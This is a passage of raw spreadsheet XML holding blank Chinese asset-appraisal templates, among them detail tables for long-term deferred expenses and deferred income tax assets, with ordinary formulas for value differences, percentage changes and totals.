      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="615">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="383" t="n"/>
      <c r="J21" s="156" t="n"/>
    </row>
    <row r="22" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="615">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="383" t="n"/>
      <c r="J22" s="156" t="n"/>
    </row>
    <row r="23" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="615">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="383" t="n"/>
      <c r="J23" s="156" t="n"/>
    </row>
    <row r="24" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B24" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C24" s="567" t="n"/>
      <c r="D24" s="115" t="n"/>
      <c r="E24" s="555">
        <f>ROUND(SUM(E6:E23),2)</f>
        <v/>
      </c>
      <c r="F24" s="555">
        <f>ROUND(SUM(F6:F23),2)</f>
        <v/>
      </c>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="615">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="383" t="n"/>
      <c r="J24" s="156" t="n"/>
    </row>
    <row r="25" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B25" s="380" t="inlineStr">
        <is>
          <t>减：商誉减值准备</t>
        </is>
      </c>
      <c r="C25" s="567" t="n"/>
      <c r="D25" s="115" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="615">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="383" t="n"/>
      <c r="J25" s="156" t="n"/>
    </row>
    <row r="26" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B26" s="380" t="inlineStr">
        <is>
          <t>合             计</t>
        </is>
      </c>
      <c r="C26" s="567" t="n"/>
      <c r="D26" s="115" t="n"/>
      <c r="E26" s="555">
        <f>E24-E25</f>
        <v/>
      </c>
      <c r="F26" s="555">
        <f>F24-F25</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="615">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="383" t="n"/>
      <c r="J26" s="156" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="5">
    <mergeCell ref="B24:C24"/>
    <mergeCell ref="B25:C25"/>
    <mergeCell ref="B2:I2"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B1:I1"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:I26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 codeName="Sheet76">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="13.3333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="25.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="14.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="7.66666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="10"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col width="10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长期待摊费用评估明细表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373" t="n"/>
      <c r="L3" s="402" t="inlineStr">
        <is>
          <t>表4-16</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="27" customFormat="1" customHeight="1" s="160">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>费用名称或内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>形成日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>原始发生额</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>预计摊
销月数</t>
        </is>
      </c>
      <c r="G5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="272" t="inlineStr">
        <is>
          <t>尚存受
益月数</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L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78" t="n"/>
      <c r="E6" s="555" t="n"/>
      <c r="F6" s="552" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="552" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555">
        <f>I6-G6</f>
        <v/>
      </c>
      <c r="K6" s="555">
        <f>IF(G6=0,"",J6/G6*100)</f>
        <v/>
      </c>
      <c r="L6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="552" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="552" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555">
        <f>I7-G7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(G7=0,"",J7/G7*100)</f>
        <v/>
      </c>
      <c r="L7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="552" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="552" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555">
        <f>I8-G8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(G8=0,"",J8/G8*100)</f>
        <v/>
      </c>
      <c r="L8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="552" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="552" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555">
        <f>I9-G9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(G9=0,"",J9/G9*100)</f>
        <v/>
      </c>
      <c r="L9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="552" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="552" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555">
        <f>I10-G10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(G10=0,"",J10/G10*100)</f>
        <v/>
      </c>
      <c r="L10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="552" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="552" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555">
        <f>I11-G11</f>
        <v/>
      </c>
      <c r="K11" s="555">
        <f>IF(G11=0,"",J11/G11*100)</f>
        <v/>
      </c>
      <c r="L11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="552" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="552" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555">
        <f>I12-G12</f>
        <v/>
      </c>
      <c r="K12" s="555">
        <f>IF(G12=0,"",J12/G12*100)</f>
        <v/>
      </c>
      <c r="L12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="552" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="552" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555">
        <f>I13-G13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(G13=0,"",J13/G13*100)</f>
        <v/>
      </c>
      <c r="L13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="552" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="552" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555">
        <f>I14-G14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(G14=0,"",J14/G14*100)</f>
        <v/>
      </c>
      <c r="L14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="552" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="552" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555">
        <f>I15-G15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(G15=0,"",J15/G15*100)</f>
        <v/>
      </c>
      <c r="L15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="552" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="552" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555">
        <f>I16-G16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(G16=0,"",J16/G16*100)</f>
        <v/>
      </c>
      <c r="L16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="552" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="552" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555">
        <f>I17-G17</f>
        <v/>
      </c>
      <c r="K17" s="555">
        <f>IF(G17=0,"",J17/G17*100)</f>
        <v/>
      </c>
      <c r="L17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="552" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="552" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555">
        <f>I18-G18</f>
        <v/>
      </c>
      <c r="K18" s="555">
        <f>IF(G18=0,"",J18/G18*100)</f>
        <v/>
      </c>
      <c r="L18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="552" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="552" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555">
        <f>I19-G19</f>
        <v/>
      </c>
      <c r="K19" s="555">
        <f>IF(G19=0,"",J19/G19*100)</f>
        <v/>
      </c>
      <c r="L19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="552" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="552" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555">
        <f>I20-G20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(G20=0,"",J20/G20*100)</f>
        <v/>
      </c>
      <c r="L20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="552" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="552" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555">
        <f>I21-G21</f>
        <v/>
      </c>
      <c r="K21" s="555">
        <f>IF(G21=0,"",J21/G21*100)</f>
        <v/>
      </c>
      <c r="L21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="552" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="552" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555">
        <f>I22-G22</f>
        <v/>
      </c>
      <c r="K22" s="555">
        <f>IF(G22=0,"",J22/G22*100)</f>
        <v/>
      </c>
      <c r="L22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="552" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="552" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555">
        <f>I23-G23</f>
        <v/>
      </c>
      <c r="K23" s="555">
        <f>IF(G23=0,"",J23/G23*100)</f>
        <v/>
      </c>
      <c r="L23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="552" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="552" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555">
        <f>I24-G24</f>
        <v/>
      </c>
      <c r="K24" s="555">
        <f>IF(G24=0,"",J24/G24*100)</f>
        <v/>
      </c>
      <c r="L24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="552" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="552" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555">
        <f>I25-G25</f>
        <v/>
      </c>
      <c r="K25" s="555">
        <f>IF(G25=0,"",J25/G25*100)</f>
        <v/>
      </c>
      <c r="L25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="555" t="n"/>
      <c r="F26" s="552" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="552" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>I26-G26</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>IF(G26=0,"",J26/G26*100)</f>
        <v/>
      </c>
      <c r="L26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="555" t="n"/>
      <c r="F27" s="552" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="552" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555">
        <f>I27-G27</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>IF(G27=0,"",J27/G27*100)</f>
        <v/>
      </c>
      <c r="L27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="115" t="n"/>
      <c r="E28" s="555" t="n"/>
      <c r="F28" s="552" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="552" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555">
        <f>I28-G28</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>IF(G28=0,"",J28/G28*100)</f>
        <v/>
      </c>
      <c r="L28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合                    计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="115" t="n"/>
      <c r="E29" s="555">
        <f>ROUND(SUM(E6:E28),2)</f>
        <v/>
      </c>
      <c r="F29" s="552" t="n"/>
      <c r="G29" s="555">
        <f>ROUND(SUM(G6:G28),2)</f>
        <v/>
      </c>
      <c r="H29" s="552" t="n"/>
      <c r="I29" s="555">
        <f>ROUND(SUM(I6:I28),2)</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>I29-G29</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>IF(G29=0,"",J29/G29*100)</f>
        <v/>
      </c>
      <c r="L29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B2:L2"/>
    <mergeCell ref="B1:L1"/>
    <mergeCell ref="B29:C29"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:L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6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 codeName="Sheet77">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L29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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="13.8333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="27.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="12.3333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col width="16.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="9" customWidth="1" style="410" min="10" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>递延所得税资产评估明细表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  <c r="J2" s="376" t="n"/>
      <c r="K2" s="376" t="n"/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8" t="inlineStr">
        <is>
          <t>表4-17</t>
        </is>
      </c>
      <c r="J3" s="376" t="n"/>
      <c r="K3" s="376" t="n"/>
    </row>
    <row r="4" ht="16.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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="185" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>内容或名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期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80" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
      <c r="J5" s="344" t="n"/>
      <c r="K5" s="344" t="n"/>
      <c r="L5" s="154" t="n"/>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="555" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="615">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="383" t="n"/>
      <c r="J6" s="347" t="n"/>
      <c r="K6" s="347" t="n"/>
      <c r="L6" s="156" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="564" t="n"/>
      <c r="F7" s="564" t="n"/>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="615">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="383" t="n"/>
      <c r="J7" s="347" t="n"/>
      <c r="K7" s="347" t="n"/>
      <c r="L7" s="156" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="564" t="n"/>
      <c r="F8" s="564" t="n"/>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="615">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="383" t="n"/>
      <c r="J8" s="347" t="n"/>
      <c r="K8" s="347" t="n"/>
      <c r="L8" s="156" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="564" t="n"/>
      <c r="F9" s="564" t="n"/>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="615">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="383" t="n"/>
      <c r="J9" s="347" t="n"/>
      <c r="K9" s="347" t="n"/>
      <c r="L9" s="156" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="564" t="n"/>
      <c r="F10" s="564" t="n"/>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="615">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="383" t="n"/>
      <c r="J10" s="347" t="n"/>
      <c r="K10" s="347" t="n"/>
      <c r="L10" s="156" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="564" t="n"/>
      <c r="F11" s="564" t="n"/>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="615">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="383" t="n"/>
      <c r="J11" s="347" t="n"/>
      <c r="K11" s="347" t="n"/>
      <c r="L11" s="156" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="564" t="n"/>
      <c r="F12" s="564" t="n"/>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="615">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="383" t="n"/>
      <c r="J12" s="347" t="n"/>
      <c r="K12" s="347" t="n"/>
      <c r="L12" s="156" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="564" t="n"/>
      <c r="F13" s="564" t="n"/>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="615">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="383" t="n"/>
      <c r="J13" s="347" t="n"/>
      <c r="K13" s="347" t="n"/>
      <c r="L13" s="156" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="564" t="n"/>
      <c r="F14" s="564" t="n"/>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="615">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="383" t="n"/>
      <c r="J14" s="347" t="n"/>
      <c r="K14" s="347" t="n"/>
